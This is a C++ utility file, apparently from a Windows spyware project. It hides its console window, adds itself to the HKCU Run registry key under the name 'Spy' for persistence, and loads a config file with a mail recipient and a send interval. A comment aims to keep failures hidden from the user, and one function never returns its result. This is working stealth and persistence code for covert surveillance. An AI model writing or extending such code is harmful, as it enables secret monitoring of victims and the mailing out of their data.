#include "stdafx.h"

#include "Utility.h"
#include <fstream>

void utility::hide_window()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE); // Minimalize console
}

void utility::add_application_to_startup()
{
	std::string program_path_string = get_application_path();
	std::wstring program_path(program_path_string.begin(), program_path_string.end());
	
	HKEY hkey = NULL;
	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
	LONG status = RegSetValueEx(hkey, L"Spy", 0, REG_SZ, (BYTE *)program_path.c_str(), (program_path.size() + 1) * sizeof(wchar_t));
}

std::string utility::get_application_path()
{
	char selfpath[MAX_PATH];
	wchar_t selfpath_wchar[MAX_PATH];

	GetModuleFileName(NULL, selfpath_wchar, MAX_PATH);
	size_t pReturnValue;
	wcstombs_s(&pReturnValue, selfpath, MAX_PATH, selfpath_wchar, MAX_PATH);

	return std::string(selfpath);
}

bool utility::file_exists(const std::string &file_name)
{
	std::ifstream file(file_name.c_str());
	return file.good();
}

configuration::configuration_file_content configuration::fill_configuration_struct()
{
	// Load data from configuration file
	std::ifstream configuration_file(configuration_file_name);
	configuration_file_content configuration;
	std::string line;

	if (configuration_file.is_open())
	{
		std::getline(configuration_file, line);
		configuration.mail_to = line;

		line.clear();
		std::getline(configuration_file, line);
		configuration.mail_send_loop = std::stoi(line);


		// TODO: Load up keywords here.
	}
	else
	{
		// Handle it somehow, but don't let the user know.
	}
}